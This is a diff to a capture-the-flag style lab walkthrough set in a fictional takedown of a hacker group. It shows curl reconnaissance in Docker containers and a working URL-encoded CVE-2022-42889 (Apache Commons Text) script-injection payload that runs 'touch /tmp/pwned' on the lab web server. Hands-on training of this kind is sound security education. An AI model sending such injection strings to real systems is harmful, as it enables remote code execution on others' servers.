@@ -21,10 +21,11 @@ Globomantics is under cyber seige by the nefarious Dark Kittens Collective hacki
   + `curl -v '10.0.0.3:8080'`
   + `echo "VXNlIHNlYXJjaCBwYXJhbWV0ZXIgZm9yIE1GQQ==" | base64 -d`
   + `curl -XGET '10.0.0.3:8080/search?n=ghost'` (optional: repeat to see MFA code change)
-+ We've found the Dark Kittens Collective Multi-Factor Authentication Generator (may come in handy later *future lab storyline enhancement*). This Apache webserver definitely uses scripting and some string replacement functionality. Cue research and we find there is a recently discovered vulnerability in Apache Commons Text that may come in handy if the Dark Kittens Collective hasn't patched yet! Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42889
++ We've found the Dark Kittens Collective Multi-Factor Authentication Generator (may come in handy later *future lab storyline enhancement*). This Apache Tomcat webserver (because of course it is) definitely uses scripting and some string replacement functionality. Cue research and we find there is a recently discovered vulnerability in Apache Commons Text that may come in handy if the Dark Kittens Collective hasn't patched yet! Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42889
 
 ### Verification
-+ Since this is a takedown, we have no reason for stealth and want to let these Dark Kittens know we are after them so to verify the vulnerability we're going to drop a calling card on the webserver. Tip: Make sure to urlencode the script line so special characters are properly interpreted.
++ Since this is a takedown, we have no reason for stealth and want to let these Dark Kittens know we are after them so to verify the vulnerability we're going to drop a calling card on the webserver.
++ Tip: Make sure to urlencode the script line so special characters are properly interpreted.
   + To leave a calling card in /tmp/pwned, type `docker exec -it $(docker ps -aqf "name=attack-box") curl -XGET '10.0.0.3:8080/search?n=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Fpwned%27%29%7D'`
   + To verify our calling card is on the webserver, type `docker exec -it $(docker ps -aqf "name=web-server") ls /tmp` 
     + *In real life, the Dark Kittens Collective webserver wouldn't be running in a local docker container (unless you are a hacker cat!) so we wouldn't be able to run this command.*
